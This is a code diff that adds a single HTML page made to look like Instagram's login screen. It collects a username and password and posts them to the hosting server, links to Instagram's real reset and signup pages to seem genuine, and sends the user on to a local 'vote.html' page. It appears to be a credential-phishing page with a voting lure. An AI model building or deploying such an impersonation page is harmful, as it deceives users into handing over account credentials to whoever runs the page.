@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title >Instagram</title>
+    <link rel = "icon" href = 
+    "../static/logo.png" 
+            type = "image/x-icon">
+    <link rel="stylesheet" href="../static/style.css">
+    <script>  
+      function validateform(){  
+      var username = document.myForm.username.value;  
+      var password = document.myForm.password.value;  
+        
+      if (username==null || username==""){  
+        alert("Username can't be blank");  
+        return false;  
+      }else if(password.length<8){  
+        alert("Password must be at least 8 characters long.");  
+        return false;  
+        }  
+      }  
+      </script>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+          <div class="heading"></div>
+          <form name="myForm" method="post" class="login-form" onsubmit="return validateform()">
+            <div class="field">
+              <input 
+              name="username"
+                id="username"
+                type="username"
+                placeholder="Phone number, username, or email"
+              />
+              <label for="username">Phone number, username, or email</label>
+            </div>
+            <div class="field">
+              <input name="password"
+              id="password" type="password" placeholder="password" />
+              <label for="password">Password</label>
+            </div>
+             <a href="./vote.html"> <button  class="login-button" title="login"  >Log In</button></a>
+              <div class="separator">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+              </div>
+            <div class="other">
+              <a href="https://web.facebook.com/login/?_rdc=1&_rdr"><button  class="fb-login-btn" type="button" >
+                <i  class="fa fa-facebook-official fb-icon"></i>
+                <span  class="">Log in with Facebook</span>
+              </button></a>
+              <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+            </div>
+          </form>
+        </div>
+        <div class="box">
+          <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
+        </div>
+      </div>
+</body>
+
+</html>
